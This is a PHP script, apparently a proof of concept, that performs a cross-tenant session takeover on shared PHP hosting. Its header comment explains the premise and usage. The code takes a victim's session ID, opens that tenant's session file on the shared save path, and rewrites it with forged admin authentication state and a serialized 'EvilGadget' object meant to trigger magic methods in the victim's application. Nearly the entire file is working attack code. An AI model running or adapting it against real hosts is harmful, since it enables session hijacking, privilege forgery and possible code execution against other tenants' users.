<?php
/**
 * shape10_takeover.php — cross-tenant FULL session takeover (shape c).
 *
 * Premise: attacker tenant's own PHP code on a vhost sharing save_path with
 * the victim tenant + session.use_strict_mode=0 (the default). No memory
 * bug, no framework — the session FILES on a shared save_path have no
 * ownership: any tenant can adopt any SID and rewrite the file.
 *
 *   session_id(<victim sid>) + session_start()   -> opens the VICTIM's file
 *   $_SESSION = <attacker state>                  -> rewrites it cleanly in
 *                                                    the VICTIM's own format
 *
 * Result on the victim's next read: CLEAN decode (no warning, session
 * intact) of a fully attacker-controlled session — forged auth state AND
 * attacker-chosen objects (class-name collision with the victim app's
 * EvilGadget: only the NAME travels in the serialized form, so the victim
 * process instantiates ITS EvilGadget with attacker property values ->
 * __wakeup during decode, __destruct at normal shutdown).
 *
 * usage: GET /shape10_takeover.php?sid=<victim-sid>&uid=<...>&role=<...>&cmd=<...>
 */
error_reporting(E_ALL);
ini_set('display_errors', '1');

/* property-only collision class: serialization emits the class NAME;
 * the victim app's EvilGadget is what gets instantiated on their side. */
class EvilGadget {
    public string $cmd = '';
}

$sid   = $_GET['sid'] ?? '';
$uid   = $_GET['uid'] ?? 'attacker-admin';
$role  = $_GET['role'] ?? 'admin';
$cmd   = $_GET['cmd'] ?? 'pwn-via-takeover';

if (!preg_match('/^[A-Za-z0-9,-]{1,128}$/', $sid)) {
    http_response_code(400);
    echo "TAKEOVER-FAIL bad sid\n";
    return;
}

ini_set('session.serialize_handler', 'php');   // write in the VICTIM's format
ini_set('session.use_strict_mode', '0');
session_id($sid);
session_start();

$_SESSION = [];                                // drop any prior content
$_SESSION['uid']  = $uid;                      // forged auth state
$_SESSION['role'] = $role;
$g = new EvilGadget();
$g->cmd = $cmd;
$_SESSION['pwn']  = $g;                        // forged gadget object

session_write_close();
echo "TAKEOVER-WROTE sid=$sid uid=$uid role=$role cmd=$cmd\n";
